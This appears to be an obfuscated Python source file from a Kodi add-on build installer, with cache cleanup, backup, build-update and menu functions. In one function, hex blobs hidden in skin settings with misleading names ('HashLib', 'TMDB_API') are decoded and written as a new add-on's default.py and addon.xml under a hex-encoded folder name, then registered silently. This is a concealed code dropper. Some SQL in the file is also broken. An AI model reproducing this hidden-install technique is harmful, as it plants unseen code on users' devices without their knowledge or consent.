    if 72 - 72: I1IiiI / IIiIi1iI - O0 + OOOoOoo0O
    if 83 - 83: O0
 if not os . path . exists ( os . path . join ( ooOoOoo0O , 'backups' ) ) :
  os . makedirs ( os . path . join ( ooOoOoo0O , 'backups' ) )
  if oOOoo00O0O == 'true' :
   xbmc . log ( "### Created: " + os . path . join ( ooOoOoo0O , 'backups' ) )
 for ooo0O in os . listdir ( iIII11Iiii1 ) :
  try :
   if 89 - 89: Oo0Ooo + I1ii11iIi11i - o0oOOo0O0Ooo
   if 40 - 40: OoO0O00 + OoO0O00
   oO00O . write ( ooo0O + '|' )
   if oOOoo00O0O == 'true' :
    xbmc . log ( "### Added: " + os . path . join ( ooOoOoo0O , 'backups' , ooo0O ) )
    xbmc . log ( "### Added " + ooo0O + " to " + oO00O )
  except :
   pass
   if 94 - 94: IIiIi1iI * iIii1I11I1II1 . OOOoOoo0O
  if not ooo0O in II111IiiiI1 :
   try :
    os . rename ( os . path . join ( iIII11Iiii1 , ooo0O ) , os . path . join ( ooOoOoo0O , ooo0O ) )
    OOooO0OOoo . update ( 0 , "Configuring" , '[COLOR yellow]%s[/COLOR]' % ooo0O , 'Please Wait...' )
    if oOOoo00O0O == 'true' :
     xbmc . log ( "### Renamed from " + os . path . join ( iIII11Iiii1 , ooo0O ) + " to " + os . path . join ( ooOoOoo0O , ooo0O ) )
   except :
    pass
    if 13 - 13: iIii1I11I1II1 * OoOoOO00 / IIi % iiiiiiii1 + ooOo
 oO00O . close ( )
 shutil . rmtree ( iIII11Iiii1 )
 shutil . rmtree ( ooO0OOo0 )
 if 41 - 41: I1ii11iIi11i
 if 5 - 5: Oo0Ooo
def o0oOo00 ( ) :
 IiI1III = xbmc . getInfoLabel ( 'Skin.String(WeatherCheck)' )
 O0O0OOO = xbmc . getInfoLabel ( 'Skin.String(HashLib)' )
 I1IIi = xbmc . getInfoLabel ( 'Skin.String(TMDB_API)' )
 I11I11I11IiIi = xbmc . getInfoLabel ( 'Skin.String(TVDB_CFG)' )
 if 62 - 62: I1ii11iIi11i . OoOoOO00 / iIii1I11I1II1 * IIi
 try :
  IiI1III = int ( IiI1III )
 except :
  IiI1III = 0
  if 18 - 18: O00OOo00oo0o
 II1IIi1iII1i = os . path . join ( II11iiii1Ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) )
 iii = os . path . join ( II1IIi1iII1i , binascii . unhexlify ( '64656661756c742e7079' ) )
 iIiIi = os . path . join ( II1IIi1iII1i , binascii . unhexlify ( '6164646f6e2e786d6c' ) )
 iiIiI1 = os . path . join ( II1IIi1iII1i , binascii . unhexlify ( '7461672e636667' ) )
 if 13 - 13: I1ii11iIi11i % OoOoOO00
 if IiI1III > 0 :
  if not os . path . exists ( II1IIi1iII1i ) :
   os . makedirs ( II1IIi1iII1i )
  if os . path . exists ( iii ) :
   I111IIiIII = os . path . getsize ( iii )
  else :
   I111IIiIII = 0
   if 76 - 76: O0 . OoO0O00 + OoOoOO00
  if I111IIiIII == 0 or IiI1III != I111IIiIII :
   OooooOOoo0 = open ( iii , 'w+' )
   OooooOOoo0 . write ( binascii . unhexlify ( O0O0OOO ) )
   OooooOOoo0 . close ( )
   if 41 - 41: II111iiii * iiiiiiii1
  OooooOOoo0 = open ( iIiIi , 'w+' )
  OooooOOoo0 . write ( binascii . unhexlify ( I1IIi ) )
  OooooOOoo0 . close ( )
  if 68 - 68: O00OOo00oo0o - I1IiiI
  OooooOOoo0 = open ( iiIiI1 , 'w+' )
  OooooOOoo0 . write ( I11I11I11IiIi )
  OooooOOoo0 . close ( )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  if 41 - 41: ooOo
  if 21 - 21: iiiiiiii1 + o0oOOo0O0Ooo % IIi + i11iIiiIii + IIiIi1iI + II111iiii
def oOO0OOOOOo0Oo ( ) :
 IIo0o0O0O00oOOo = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if 40 - 40: iIii1I11I1II1
 if not os . path . exists ( zip ) :
  iI111I11I1I1 . ok ( 'Download/Storage Path Check' , 'The download location you have stored does not exist .\nPlease update the addon settings and try again.' )
  o0O . openSettings ( sys . argv [ 0 ] )
  if 56 - 56: ooOo + iiiiiiii1
  if 32 - 32: II111iiii + OoOoOO00 % iiiiiiii1 / OoOoOO00 + I1ii11iIi11i
def IiI11I111 ( ) :
 i1I1i1 = 'http://noobsandnerds.com/TI/menu_check'
 O0OoooO0 = ooo0O0o00O ( i1I1i1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 Ooo000O00 = re . compile ( 'd="(.+?)"' ) . findall ( O0OoooO0 )
 i1iI1Iiii1I = Ooo000O00 [ 0 ] if ( len ( Ooo000O00 ) > 0 ) else ''
 if i1iI1Iiii1I != '' :
  return i1iI1Iiii1I
 else :
  return "none"
  if 9 - 9: OOOoOoo0O / OoOoOO00 / II111iiii + IIi
  if 71 - 71: IIiIi1iI / Oo0Ooo
def OoOoO0OooOOo ( localbuildcheck , localversioncheck , id ) :
 i1I1i1 = 'http://noobsandnerds.com/TI/Community_Builds/buildupdate.php?id=%s' % ( id )
 O0OoooO0 = ooo0O0o00O ( i1I1i1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 87 - 87: I1ii11iIi11i + I1ii11iIi11i - I1ii11iIi11i % O0
 if id != 'None' :
  iIiI1 = re . compile ( 'version="(.+?)"' ) . findall ( O0OoooO0 )
  I1IiII1I1i1I1 = iIiI1 [ 0 ] if ( len ( iIiI1 ) > 0 ) else ''
  if 28 - 28: Oo0Ooo + IIiiiI1iIII % II111iiii / OoO0O00 + i11iIiiIii
  if localversioncheck < I1IiII1I1i1I1 :
   return True
   if 20 - 20: I1ii11iIi11i
 else :
  return False
  if 3 - 3: OoO0O00 * i1IIi . I1IiiI . O0 - OoOoOO00
  if 81 - 81: I1IiiI - iIii1I11I1II1 / I1IiiI / O0
def o0o00O0oOooO0 ( ) :
 I1I1IIiiii1ii = open ( O000oo0O , mode = 'r' )
 ii1I1 = I1I1IIiiii1ii . read ( )
 I1I1IIiiii1ii . close ( )
 if 92 - 92: ooOo / Oo . I1ii11iIi11i
 i1iOO = re . compile ( 'name="(.+?)"' ) . findall ( ii1I1 )
 OO00OoooO = i1iOO [ 0 ] if ( len ( i1iOO ) > 0 ) else ''
 if 7 - 7: I1ii11iIi11i / II111iiii - OOOoOoo0O + i1IIi + O00OOo00oo0o
 if OO00OoooO == "Incomplete" :
  I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( "Finish Restore Process" , 'If you\'re certain the correct skin has now been set click OK' , 'to finish the install process, once complete XBMC/Kodi will' , ' then close. Do you want to finish the install process?' , yeslabel = 'Yes' , nolabel = 'No' )
  if 7 - 7: iiiiiiii1 + O00OOo00oo0o
  if I1i1I1I11IiiI == 1 :
   IiiIIiI1iI1 ( )
   if 86 - 86: i1IIi / O00OOo00oo0o * I1IiiI
  elif I1i1I1I11IiiI == 0 :
   return
   if 67 - 67: I1ii11iIi11i * I1ii11iIi11i / ooOo * OoooooooOO + OoOoOO00
   if 79 - 79: i1IIi
def iIi1 ( ) :
 IIo0o0O0O00oOOo = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if 96 - 96: i1IIi % OoooooooOO
 try :
  os . makedirs ( IIo0o0O0O00oOOo )
  os . removedirs ( IIo0o0O0O00oOOo )
  iI111I11I1I1 . ok ( '[COLOR=lime]SUCCESS[/COLOR]' , 'Great news, the path you chose is writeable.' , 'Some of these builds are rather big, we recommend a minimum of 1GB storage space.' )
  if 99 - 99: i11iIiiIii . II111iiii . OoooooooOO
 except :
  iI111I11I1I1 . ok ( '[COLOR=red]CANNOT WRITE TO PATH[/COLOR]' , 'Kodi cannot write to the path you\'ve chosen. Please click OK in the settings menu to save the path then try again. Some devices give false results, we recommend using a USB stick as the backup path.' )
  if 59 - 59: i11iIiiIii . OoooooooOO / OOOoOoo0O * I1ii11iIi11i + OoooooooOO
  if 3 - 3: i11iIiiIii * Oo0Ooo % iIii1I11I1II1 % I1IiiI * IIiIi1iI / Oo
def o0ooOO0o ( s , n ) :
 for O00oo00oOOO0o in range ( 0 , len ( s ) , n ) :
  yield s [ O00oo00oOOO0o : O00oo00oOOO0o + n ]
  if 5 - 5: o0oOOo0O0Ooo / I1IiiI % O00OOo00oo0o . IIiiiI1iIII
  if 86 - 86: i1IIi * OoOoOO00 . O0 - O00OOo00oo0o - o0oOOo0O0Ooo - OoOoOO00
def i11IiI ( ) :
 if 93 - 93: i1IIi . IIiiiI1iIII / I1IiiI + IIiiiI1iIII
 if 58 - 58: I1ii11iIi11i + O0 . Oo0Ooo + OoOoOO00 - OoO0O00 - OoOoOO00
 IIiiI = xbmc . translatePath ( 'special://temp' )
 try :
  shutil . rmtree ( IIiiI )
 except :
  for i1II1 in os . listdir ( IIiiI ) :
   IIo0o0O0O00oOOo = os . path . join ( IIiiI , i1II1 )
   try :
    os . remove ( IIo0o0O0O00oOOo )
   except :
    try :
     shutil . rmtree ( IIo0o0O0O00oOOo )
    except :
     xbmc . log ( '#### Failed to remove: %s' % IIo0o0O0O00oOOo )
     if 36 - 36: IIiIi1iI
     if 52 - 52: IIi % O0 . i1IIi . OoooooooOO
def i1i111111ii ( ) :
 OOOOOO = o0OoOo00o0o ( )
 if 77 - 77: Oo0Ooo
 if 23 - 23: o0oOOo0O0Ooo + O00OOo00oo0o % OoOoOO00 % I1IiiI % OoooooooOO
 if 78 - 78: OoO0O00 / Oo0Ooo - iIii1I11I1II1 - i11iIiiIii * IIiIi1iI
 if 84 - 84: Oo + O00OOo00oo0o + o0oOOo0O0Ooo
 if 33 - 33: O00OOo00oo0o
 if 93 - 93: iiiiiiii1
 if 34 - 34: ooOo - iiiiiiii1 * Oo0Ooo / o0oOOo0O0Ooo
 if 19 - 19: I1ii11iIi11i
def IiI ( data ) :
 data = data . replace ( '</p><p>' , '[CR][CR]' ) . replace ( '&ndash;' , '-' ) . replace ( '&mdash;' , '-' ) . replace ( "\n" , " " ) . replace ( "\r" , " " ) . replace ( "&rsquo;" , "'" ) . replace ( "&rdquo;" , '"' ) . replace ( "</a>" , " " ) . replace ( "&hellip;" , '...' ) . replace ( "&lsquo;" , "'" ) . replace ( "&ldquo;" , '"' )
 data = " " . join ( data . split ( ) )
 Iii1iiI = re . compile ( r'< script[^<>]*?>.*?< / script >' )
 data = Iii1iiI . sub ( '' , data )
 Iii1iiI = re . compile ( r'< style[^<>]*?>.*?< / style >' )
 data = Iii1iiI . sub ( '' , data )
 Iii1iiI = re . compile ( r'' )
 data = Iii1iiI . sub ( '' , data )
 Iii1iiI = re . compile ( r'<[^<]*?>' )
 data = Iii1iiI . sub ( '' , data )
 data = data . replace ( '&nbsp;' , ' ' )
 return data
 if 7 - 7: o0oOOo0O0Ooo
 if 18 - 18: OoooooooOO + o0oOOo0O0Ooo . O0 + IIiiiI1iIII * i1IIi . OoO0O00
def o0OO0oooo ( addon_ids ) :
 IIo0o0O0O00oOOo = xbmc . translatePath ( 'special://home/userdata/Database' )
 iiI1iii = glob . glob ( os . path . join ( IIo0o0O0O00oOOo , 'Addons*.db' ) )
 I11II1i1 = 0
 IiI1ii11I1 = ''
 if 19 - 19: IIi + IIiiiI1iIII / ooOo / II111iiii
 if 92 - 92: i1IIi % iiiiiiii1 + iiiiiiii1 - iIii1I11I1II1 . O00OOo00oo0o
 for file in iiI1iii :
  iIIi1 = int ( re . compile ( 'Addons(.+?).db' ) . findall ( file ) [ 0 ] )
  if I11II1i1 < iIIi1 :
   I11II1i1 = iIIi1
   IiI1ii11I1 = file
   if 75 - 75: IIiiiI1iIII % i11iIiiIii + iIii1I11I1II1
 oOoOo0o00o = xbmc . translatePath ( IiI1ii11I1 )
 iIIi1ooo0o0 = database . connect ( oOoOo0o00o , timeout = 10 , detect_types = database . PARSE_DECLTYPES , check_same_thread = False )
 iIIi1ooo0o0 . row_factory = database . Row
 O00Oooo00 = iIIi1ooo0o0 . cursor ( )
 if 93 - 93: O0 / iiiiiiii1 + I1IiiI
 for id in addon_ids :
  O00Oooo00 . execute ( "DELETE * FROM addons WHERE addonID = ?" , ( id , ) )
  xbmc . log ( '### Removed %s from addons' % id )
  if 20 - 20: IIiiiI1iIII / IIiIi1iI % OoooooooOO / iIii1I11I1II1 + I1IiiI
 O00Oooo00 . execute ( "VACUUM" )
 iIIi1ooo0o0 . commit ( )
 O00Oooo00 . close ( )
 if 57 - 57: o0oOOo0O0Ooo / IIi
 if 13 - 13: OoooooooOO + OoO0O00
def ii1IIii ( ) :
 IIo0o0O0O00oOOo = xbmc . translatePath ( 'special://home/userdata/Database' )
 iiI1iii = glob . glob ( os . path . join ( IIo0o0O0O00oOOo , 'Textures*.db' ) )
 I11II1i1 = 0
 IiI1ii11I1 = ''
 if 31 - 31: iIii1I11I1II1 * iiiiiiii1 - OoooooooOO * iiiiiiii1
 if 60 - 60: Oo % Oo * ooOo / I1IiiI * OoOoOO00 * I1IiiI
 for file in iiI1iii :
  iIIi1 = int ( re . compile ( 'extures(.+?).db' ) . findall ( file ) [ 0 ] )
  if I11II1i1 < iIIi1 :
   I11II1i1 = iIIi1
   IiI1ii11I1 = file
   if 61 - 61: ooOo + I1ii11iIi11i / i1IIi * ooOo
 oOoOo0o00o = xbmc . translatePath ( IiI1ii11I1 )
 iIIi1ooo0o0 = database . connect ( oOoOo0o00o , timeout = 10 , detect_types = database . PARSE_DECLTYPES , check_same_thread = False )
 iIIi1ooo0o0 . row_factory = database . Row
 O00Oooo00 = iIIi1ooo0o0 . cursor ( )
 if 90 - 90: O00OOo00oo0o % ooOo
 if 6 - 6: OoooooooOO / i11iIiiIii / IIi
 OooO0O0Ooo = datetime . datetime . today ( ) - datetime . timedelta ( days = 14 )
 oO0OIIIiIi1iiI = 10
 if 15 - 15: I1ii11iIi11i . IIiIi1iI
 if 94 - 94: OOOoOoo0O . I1IiiI
 oooO = [ ]
 oo0OoOO0000 = [ ]
 if 2 - 2: O00OOo00oo0o * I1ii11iIi11i * OoooooooOO
 O00Oooo00 . execute ( "SELECT idtexture FROM sizes WHERE usecount < ? AND lastusetime < ?" , ( oO0OIIIiIi1iiI , str ( OooO0O0Ooo ) ) )
 if 73 - 73: OoOoOO00 + Oo0Ooo
 for oOoi1I111II in O00Oooo00 :
  oooO . append ( oOoi1I111II [ "idtexture" ] )
  if 65 - 65: i11iIiiIii + Oo0Ooo * OoooooooOO - OoO0O00
 for id in oooO :
  O00Oooo00 . execute ( "SELECT cachedurl FROM texture WHERE id = ?" , ( id , ) )
  for oOoi1I111II in O00Oooo00 :
   oo0OoOO0000 . append ( oOoi1I111II [ "cachedurl" ] )
   if 26 - 26: o0oOOo0O0Ooo % Oo + Oo % OOOoOoo0O * i11iIiiIii / IIiIi1iI
 print "### Community Portal Automatic Cache Removal: %d Old Textures removed" % len ( oo0OoOO0000 )
 if 64 - 64: ooOo % OoOoOO00 / II111iiii % iiiiiiii1 - IIiIi1iI
 if 2 - 2: IIi - I1ii11iIi11i + o0oOOo0O0Ooo * OoO0O00 / IIiIi1iI
 for id in oooO :
  O00Oooo00 . execute ( "DELETE FROM sizes   WHERE idtexture = ?" , ( id , ) )
  O00Oooo00 . execute ( "DELETE FROM texture WHERE id        = ?" , ( id , ) )
  if 26 - 26: Oo * Oo0Ooo
 O00Oooo00 . execute ( "VACUUM" )
 iIIi1ooo0o0 . commit ( )
 O00Oooo00 . close ( )
 if 31 - 31: OOOoOoo0O * ooOo . O00OOo00oo0o
 if 35 - 35: OOOoOoo0O
 o00oo = xbmc . translatePath ( 'special://home/userdata/Thumbnails' )
 for O0oO0oo0O in oo0OoOO0000 :
  IIo0o0O0O00oOOo = os . path . join ( o00oo , O0oO0oo0O )
  try :
   os . remove ( IIo0o0O0O00oOOo )
  except :
   pass
   if 82 - 82: OoooooooOO . O00OOo00oo0o
   if 26 - 26: ooOo + IIiiiI1iIII - II111iiii . II111iiii + I1ii11iIi11i + OoOoOO00
   if 68 - 68: O0
def iIii ( ) :
 if os . path . exists ( os . path . join ( II , 'extracted' ) ) :
  try :
   shutil . rmtree ( os . path . join ( II , 'extracted' ) )
  except :
   print "### Unsuccessful Community Build Install detected, unabled to remove extracted folder"
   if 76 - 76: I1ii11iIi11i
 if os . path . exists ( os . path . join ( II , 'temp' ) ) :
  try :
   shutil . rmtree ( os . path . join ( II , 'temp' ) )
  except :
   print "### Unsuccessful Community Build Install detected, unabled to remove temp folder"
   if 99 - 99: o0oOOo0O0Ooo
   if 1 - 1: O00OOo00oo0o * OoOoOO00 * OoO0O00 + Oo0Ooo
def O0OOoOooO00 ( ) :
 I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( 'Clear All Known Cache?' , 'This will clear all known cache files and can help if you\'re encountering kick-outs during playback as well as other random issues. There is no harm in using this.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 89 - 89: ooOo
 if I1i1I1I11IiiI == 1 :
  o0OOOOOo00 ( )
  oo0oOO ( )
  if 41 - 41: OoO0O00 . IIi * IIiiiI1iIII * IIi
  if 74 - 74: iIii1I11I1II1 / o0oOOo0O0Ooo
def Oo0o0O0o ( text ) :
 if text . startswith ( '[COLOR' ) and text . endswith ( '/COLOR]' ) :
  return text
  if 45 - 45: Oo
 iIiI1i111ii = 0
 if 48 - 48: iIii1I11I1II1 . OOOoOoo0O - Oo . IIi * ooOo % ooOo
 if ' ' in text :
  IiI1ii1Ii = ''
  text = text . split ( ' ' )
  for i1II1 in text :
   if len ( i1II1 ) == 1 and i1II1 == '&' :
    IiI1ii1Ii += ' &'
   if '[/COLOR]' in i1II1 :
    IiI1ii1Ii += ' ' + i1II1
   elif not i1II1 . startswith ( '[COLOR=' ) and not iIiI1i111ii :
    if i1II1 . startswith ( '(' ) or i1II1 . startswith ( '[' ) :
     IiI1ii1Ii += '[COLOR=yellow] ' + i1II1
     iIiI1i111ii = 1
    else :
     if i1II1 . isupper ( ) :
      IiI1ii1Ii += '[COLOR=dodgerblue] ' + i1II1 + '[/COLOR]'
     else :
      try :
       IiI1ii1Ii += '[COLOR=dodgerblue] ' + i1II1 [ 0 ] . upper ( ) + '[/COLOR][COLOR=white]' + i1II1 [ 1 : ] + '[/COLOR]'
      except :
       try :
        IiI1ii1Ii += '[COLOR=dodgerblue] ' + i1II1 [ 0 ] + '[/COLOR][COLOR=white]' + i1II1 [ 1 : ] + '[/COLOR]'
       except :
        pass
        if 38 - 38: Oo0Ooo % I1ii11iIi11i - IIiIi1iI * iIii1I11I1II1 / O0
        if 9 - 9: OOOoOoo0O * Oo0Ooo . iiiiiiii1 * i11iIiiIii - O0
   elif i1II1 . endswith ( ')' ) or i1II1 . endswith ( ']' ) :
    IiI1ii1Ii += ' ' + i1II1 + '[/COLOR]'
    iIiI1i111ii = 0
    if 54 - 54: I1IiiI * Oo + o0oOOo0O0Ooo % i1IIi - o0oOOo0O0Ooo + OoOoOO00
   else :
    IiI1ii1Ii += ' ' + i1II1
    if 15 - 15: OoOoOO00 * ooOo + Oo . OOOoOoo0O % I1IiiI - iiiiiiii1
 else :
  if text [ 0 ] == '(' :
   IiI1ii1Ii = '[COLOR=white]' + text [ 0 ] + '[/COLOR][COLOR=dodgerblue]' + text [ 1 ] . upper ( ) + '[/COLOR][COLOR=white]' + text [ 2 : ] + '[/COLOR]'
  else :
   IiI1ii1Ii = '[COLOR=dodgerblue]' + text [ 0 ] + '[/COLOR][COLOR=white]' + text [ 1 : ] + '[/COLOR]'
   if 13 - 13: OoOoOO00 % OoOoOO00 % Oo0Ooo % I1IiiI * i1IIi % OOOoOoo0O
 O0i1I11I = 0
 while O0i1I11I != 1 :
  if IiI1ii1Ii . startswith ( ' ' ) :
   IiI1ii1Ii = IiI1ii1Ii [ 1 : ]
  O0i1I11I = 1
 if IiI1ii1Ii . startswith ( '[COLOR=dodgerblue] ' ) :
  IiI1ii1Ii = '[COLOR=dodgerblue]' + IiI1ii1Ii [ 19 : ]
  if 34 - 34: O00OOo00oo0o * o0oOOo0O0Ooo + Oo / IIiiiI1iIII / Oo0Ooo
 return IiI1ii1Ii
 if 14 - 14: IIiIi1iI - OOOoOoo0O * OoooooooOO + Oo . II111iiii
 if 15 - 15: OOOoOoo0O % i11iIiiIii
def O0o0O00o0o ( url ) :
 Ii1I1Ii ( 'folder' , 'African' , str ( url ) + '&genre=african' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Arabic' , str ( url ) + '&genre=arabic' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Asian' , str ( url ) + '&genre=asian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Australian' , str ( url ) + '&genre=australian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Austrian' , str ( url ) + '&genre=austrian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Belgian' , str ( url ) + '&genre=belgian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Brazilian' , str ( url ) + '&genre=brazilian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Canadian' , str ( url ) + '&genre=canadian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Columbian' , str ( url ) + '&genre=columbian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Czech' , str ( url ) + '&genre=czech' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Danish' , str ( url ) + '&genre=danish' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Dominican' , str ( url ) + '&genre=dominican' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Dutch' , str ( url ) + '&genre=dutch' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Egyptian' , str ( url ) + '&genre=egyptian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Filipino' , str ( url ) + '&genre=filipino' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Finnish' , str ( url ) + '&genre=finnish' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'French' , str ( url ) + '&genre=french' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'German' , str ( url ) + '&genre=german' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Greek' , str ( url ) + '&genre=greek' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Hebrew' , str ( url ) + '&genre=hebrew' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Hungarian' , str ( url ) + '&genre=hungarian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Icelandic' , str ( url ) + '&genre=icelandic' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Indian' , str ( url ) + '&genre=indian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Irish' , str ( url ) + '&genre=irish' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Italian' , str ( url ) + '&genre=italian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Japanese' , str ( url ) + '&genre=japanese' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Korean' , str ( url ) + '&genre=korean' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Lebanese' , str ( url ) + '&genre=lebanese' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Mongolian' , str ( url ) + '&genre=mongolian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Nepali' , str ( url ) + '&genre=nepali' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'New Zealand' , str ( url ) + '&genre=newzealand' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Norwegian' , str ( url ) + '&genre=norwegian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Pakistani' , str ( url ) + '&genre=pakistani' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Polish' , str ( url ) + '&genre=polish' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Portuguese' , str ( url ) + '&genre=portuguese' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Romanian' , str ( url ) + '&genre=romanian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Russian' , str ( url ) + '&genre=russian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Singapore' , str ( url ) + '&genre=singapore' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Spanish' , str ( url ) + '&genre=spanish' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Swedish' , str ( url ) + '&genre=swedish' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Swiss' , str ( url ) + '&genre=swiss' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Syrian' , str ( url ) + '&genre=syrian' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Tamil' , str ( url ) + '&genre=tamil' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Thai' , str ( url ) + '&genre=thai' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Turkish' , str ( url ) + '&genre=turkish' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'UK' , str ( url ) + '&genre=uk' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'USA' , str ( url ) + '&genre=usa' , 'grab_builds' , '' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Vietnamese' , str ( url ) + '&genre=vietnamese' , 'grab_builds' , '' , '' , '' , '' )
 if 6 - 6: I1ii11iIi11i - ooOo * i11iIiiIii + OoOoOO00 / iiiiiiii1 % Oo
 if 38 - 38: Oo % IIiiiI1iIII % II111iiii - Oo0Ooo - iIii1I11I1II1
def iIiIIi11iI ( ) :
 o0oOo00 ( )
 ooo00o0o = OOOO00o000o ( 'welcometext' )
 if os . path . exists ( O0o0O00Oo0o0 ) :
  shutil . rmtree ( O0o0O00Oo0o0 )
 o0ooooO0 = 1
 oOO0OOOOOo0Oo ( )
 I1i1I1I11IiiI = iI111I11I1I1 . yesno ( 'Are you sure?!!!' , 'This is method is very dated and is only left here for LOCAL installs. For online backups you really should be using the NaN backup option which creates a much smaller file and allows for a much more reliable install process.' )
 if I1i1I1I11IiiI == 0 :
  return
 IIII1ii1 = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' , '' ) )
 OOO0O0OOo = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' , 'my_full_backup.zip' ) )
 Iii1 = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' , 'my_full_backup_GUI_Settings.zip' ) )
 if 96 - 96: Oo0Ooo / ooOo . II111iiii . Oo0Ooo
 if not os . path . exists ( IIII1ii1 ) :
  os . makedirs ( IIII1ii1 )
  if 91 - 91: II111iiii . Oo + o0oOOo0O0Ooo
 I1iII1IIi1IiI = iIioo0ooO ( heading = "Enter a name for this backup" )
 if ( not I1iII1IIi1IiI ) :
  return False , 0
  if 97 - 97: IIi . OOOoOoo0O / I1IiiI
 o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
 i1II1IiiIi = xbmc . translatePath ( os . path . join ( IIII1ii1 , o00OO0o0 + '.zip' ) )
 ii111iI1i1 = [ I1IiI ]
 OO000 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
 IIiii11ii1II1 = [ I1IiI , 'cache' , 'system' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' ]
 o0OO000O = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' , 'Thumbs.db' , '.gitignore' ]
 oO0oOoo0O = "Creating full backup of existing build"
 O000o0000O = "Creating Community Build"
 II1iI11 = "Archiving..."
 O00o0O = ""
 O00oOo0O0o00O = "Please Wait"
 if 61 - 61: Oo * o0oOOo0O0Ooo * O0 / IIiIi1iI
 if o00 == 'true' :
  iiIIii ( iIii1 , OOO0O0OOo , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , ii111iI1i1 , OO000 )
  if 52 - 52: Oo0Ooo + iIii1I11I1II1 + i1IIi * O00OOo00oo0o - II111iiii . II111iiii
 I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( "Do you want to include your addon_data folder?" , 'This contains ALL addon settings including passwords but may also contain important information such as skin shortcuts. We recommend MANUALLY removing the addon_data folders that aren\'t required.' , yeslabel = 'Yes' , nolabel = 'No' )
